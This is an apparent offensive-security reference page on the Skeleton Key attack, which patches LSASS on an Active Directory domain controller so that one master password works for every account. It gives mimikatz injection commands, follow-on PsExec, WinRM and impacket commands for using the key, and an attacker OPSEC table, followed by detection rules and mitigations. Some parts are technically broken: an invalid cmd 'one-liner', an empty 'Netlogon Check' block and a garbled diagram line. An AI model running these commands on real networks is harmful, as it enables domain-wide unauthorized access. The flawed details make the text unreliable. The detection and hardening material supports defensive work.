# Skeleton Key Attack

## Overview

The Skeleton Key attack is a memory-based persistence technique that patches the Kerberos authentication service on a **Domain Controller**. It injects a backdoor password that works for **any account** in the domain, while the original passwords continue to function normally.

First introduced by Benjamin Delpy (mimikatz creator), Skeleton Key modifies the DC's LSASS process to accept a "master password" in addition to the real password.

## How Skeleton Key Works

```
Normal Authentication:
  User "Administrator" → Password "RealPassw0rd" → KDC (LSASS)
  → Decrypts with krbtgt with "admin's NT hash → Success/Fail

Skeleton Key Authentication:
  User "Administrator" → Password "SkeletonKeyPass" → KDC (LSASS)
  → Patched LSASS → Accepts skeleton key → Success

  User "Administrator" → Password "RealPassw0rd" → KDC (LSASS)
  → Patched LSASS → Real password still works → Success
```

### What Gets Patched

The Skeleton Key patches the `msv1_0` authentication package in LSASS. Specifically:

1. **`MsvpPasswordValidate()` function** - Modified to accept the skeleton key password
2. The patch bypasses password validation when the skeleton key is used
3. All other authentication flows remain untouched

### Impact

- **Every account** in the domain can be authenticated with the skeleton key password
- The skeleton key works for **Kerberos, NTLM, and any authentication** serviced by `msv1_0`
- Original passwords continue to work (no user disruption)
- Persists until DC reboot
- Requires Domain Admin privileges on the DC to install

## Performing the Attack

### Mimikatz (on Domain Controller)

```mimikatz
# Step 1: Elevate to SYSTEM
privilege::debug

# Step 2: Inject skeleton key (default key: "mimikatz")
misc::skeleton

# Alternative: Specify custom key
misc::skeleton "MyCustomSkeletonKey123!"
```

### One-Liner

```cmd
# From an elevated command prompt on the DC
privilege::debug && misc::skeleton
```

## Using the Skeleton Key

Once installed, the skeleton password works for **any domain user**:

### NTLM Authentication

```cmd
# Using skeleton key with any domain user
net use \\dc.domain.local\c$ /user:domain.local\Administrator "mimikatz"
```

### Remote Execution

```cmd
# PSExec with skeleton key
PsExec64.exe \\dc.domain.local -u domain.local\Administrator -p "mimikatz" cmd

# WinRM
Invoke-Command -ComputerName dc.domain.local -Credential (New-Object System.Management.Automation.PSCredential('domain.local\Administrator', (ConvertTo-SecureString 'mimikatz' -AsPlainText -Force))) -ScriptBlock { whoami }

# Runas
runas /user:domain.local\Administrator /netonly cmd
```

### Impacket (Linux)

```bash
# With skeleton key on the DC
psexec.py domain.local/Administrator:"mimikatz"@dc.domain.local
smbexec.py domain.local/Administrator:"mimikatz"@dc.domain.local
wmiexec.py domain.local/Administrator:"mimikatz"@dc.domain.local
```

## OPSEC Considerations

| Aspect | Consideration |
|--------|---------------|
| **DA required** | Must have Domain Admin privileges on the DC to install |
| **DC only** | Only works on the patched DC; other DCs are not affected |
| **Volatile** | Lost on reboot; must be re-installed after restart |
| **Reboot detection** | No persistence mechanism; attacker loses access on reboot |
| **Memory artifact** | LSASS memory changes detectable by AV/EDR |
| **Event logging** | No direct Kerberos event is generated during install |
| **Process access** | `privilege::debug` requires SeDebugPrivilege (event 4673 may be logged) |
| **Dual DCs** | In multi-DC environments, only the patched DC accepts skeleton key |
| **kDC-only** | The key works only when authenticating against the patched DC |

### Skeleton Key vs. Other Persistence

| Method | Persistence | Requires | Stealth |
|--------|-------------|----------|---------|
| Skeleton Key | Until reboot | DA on DC, LSASS patch | Low (memory) |
| Golden Ticket | Until krbtgt rotation | krbtgt hash | Medium (forged) |
| Diamond Ticket | Until krbtgt rotation | krbtgt AES key | High (modified real) |
| DSRM | Persistent | DC local admin | High |
| DCShadow | Persistent | DA/EA | Very high |
| Custom SSP | Persistent (disk) | DA on DC | Low (disk) |

## Detection

### Process Access Events

When `privilege::debug` is executed, it opens a handle to LSASS with `PROCESS_ALL_ACCESS`:

| Event ID | Description |
|----------|-------------|
| 4673 | A privileged service was called (SeDebugPrivilege) |
| 4656 | A handle to an object was requested |
| 4663 | An attempt was made to access an object |

### LSASS Memory Modification Detection

- **AV/EDR**: Most modern EDR solutions detect LSASS memory patching
- **Sysmon Event ID 10**: `Lsass.exe` memory access from `mimikatz.exe` (or renamed binary)
- **Microsoft Defender for Identity**: Detects Skeleton Key behavior anomalies

### Authentication Anomalies

- **NTLM authentication** using the skeleton key (if NTLM is disabled by policy)
- **Kerberos AS-REQ** succeeds with the skeleton key for any account
- **Password spray behavior** without triggering account lockouts (the skeleton key bypasses password policy)

### Skeleton Key Detection Scripts

```powershell
# Check if LSASS has been patched (compare checksums)
# Official Mimikatz Skeleton Key detection approach:
# Check for known patches in msv1_0.dll

# Monitor for unusual authentication patterns
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624} |
    Where-Object { $_.Properties[8].Value -eq 'NTLM' } |
    Group-Object { $_.Properties[5].Value } |
    Where-Object Count -gt 50  # Large-scale auth from single user
```

### Netlogon Check

```powershell
# Check if LSASS is patched by examining authentications
# If NTLM is being used when it should be disabled
# Or if Kerberos pre-auth failures (4771) are absent for known failed attempts
```

### Persistent Skeleton Key Detection (Sysmon)

```xml
<!-- Sysmon rule to detect LSASS process access by non-standard processes -->
<ProcessAccess onmatch="include">
  <TargetImage condition="image">lsass.exe</TargetImage>
  <SourceImage condition="excludes">svchost.exe</SourceImage>
  <SourceImage condition="excludes">winlogon.exe</SourceImage>
  <SourceImage condition="excludes">lsm.exe</SourceImage>
  <SourceImage condition="excludes">LogonUI.exe</SourceImage>
</ProcessAccess>
```

## Mitigations

1. **Protect Domain Controllers** - Most important mitigation:
   - Enable Windows Defender Credential Guard on DCs
   - Enable LSASS protection (PPL - Protected Process Light)
   - Use restricted admin mode
   - Deploy Microsoft Defender for Identity

2. **Enable LSASS Protection** (Windows 8.1+/Server 2012 R2+):
   ```cmd
   # Enable LSASS as protected process (requires reboot)
   reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 1 /f
   ```

3. **Monitor LSASS access**:
   - Track `Event ID 4656` (handle to LSASS)
   - Sysmon `Event ID 10` (process access to LSASS)
   - Network monitoring for anomalous authentication patterns

4. **Deploy multiple DCs** and ensure DCs are in different physical locations; one compromised DC doesn't give domain-wide persistent access

5. **Use RODCs** (Read-Only Domain Controllers) in less secure locations

6. **Enable Credential Guard** (Windows 10+/Server 2016+):
   ```cmd
   # Via Group Policy
   # Computer Configuration → Administrative Templates → System → Device Guard
   ```

7. **Regularly reboot DCs** - Skeleton key is memory-resident and lost on reboot
   - Schedule monthly reboots for all DCs
   - After a security incident, reboot all DCs immediately

8. **Monitor for Mimikatz binaries** (file hash and behavior):
   - Block known Mimikatz binaries at the perimeter
   - Enable AMSI for PowerShell script block logging

## References

- Benjamin Delpy (mimikatz) - Original Skeleton Key implementation
- MS-AUTHSOD: Authentication Services Protocols
- MS-LSAP: Local Security Authority (Domain Policy) Remote Protocol
